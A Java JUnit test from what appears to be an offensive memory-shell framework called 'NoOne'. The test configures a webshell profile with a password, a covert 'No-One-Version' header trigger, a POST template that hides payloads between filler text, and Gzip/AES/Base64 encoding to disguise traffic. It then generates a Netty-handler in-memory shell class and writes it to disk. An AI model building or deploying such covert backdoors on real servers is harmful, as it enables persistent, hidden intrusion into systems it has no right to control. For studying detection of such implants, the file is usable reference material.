package com.reajason.noone.noone.core.generator;

import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.utils.CommonUtil;
import com.reajason.noone.Constants;
import com.reajason.noone.core.generator.NoOneConfig;
import com.reajason.noone.core.generator.NoOneMemShellGenerator;
import com.reajason.noone.core.shelltool.NoOneNettyHandler;
import com.reajason.noone.server.profile.Profile;
import com.reajason.noone.server.profile.config.*;
import lombok.SneakyThrows;
import org.junit.jupiter.api.Test;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.List;

class NoOneMemShellGeneratorTest {

    @Test
    @SneakyThrows
    void testAuthed() {
        NoOneConfig noOneConfig = new NoOneConfig();
        noOneConfig.setShellClassName(CommonUtil.generateClassName());
        Profile profile = new Profile();
        profile.setPassword("noone");
        profile.setName("noone");
        IdentifierConfig identifierConfig = new IdentifierConfig();
        identifierConfig.setLocation(IdentifierLocation.HEADER);
        identifierConfig.setOperator(IdentifierOperator.EQUALS);
        identifierConfig.setName("No-One-Version");
        identifierConfig.setValue("V1");
        profile.setIdentifier(identifierConfig);

        HttpProtocolConfig httpProtocolConfig = new HttpProtocolConfig();
        httpProtocolConfig.setRequestMethod("POST");
        httpProtocolConfig.setRequestHeaders(null);
        httpProtocolConfig.setRequestBodyType(HttpRequestBodyType.TEXT);
        httpProtocolConfig.setRequestTemplate("hello{{payload}}world_test");
        httpProtocolConfig.setResponseStatusCode(200);
        httpProtocolConfig.setResponseHeaders(null);
        httpProtocolConfig.setResponseBodyType(HttpResponseBodyType.TEXT);
        httpProtocolConfig.setResponseTemplate("hello{{payload}}world_test");
        profile.setProtocolConfig(httpProtocolConfig);

        profile.setRequestTransformations(List.of("Gzip", "AES", "Base64"));
        profile.setResponseTransformations(List.of("Gzip", "AES", "Base64"));

        noOneConfig.setShellClass(NoOneNettyHandler.class);
        noOneConfig.setProfile(profile);
        ShellConfig shellConfig = ShellConfig.builder()
                .shellType(ShellType.NETTY_HANDLER)
                .shellTool(Constants.NO_ONE)
                .build();
        NoOneMemShellGenerator noOneMemShellGenerator = new NoOneMemShellGenerator(shellConfig, noOneConfig);
        byte[] bytes = noOneMemShellGenerator.getBytes();
        Files.write(Paths.get("hello.class"), bytes);
    }

}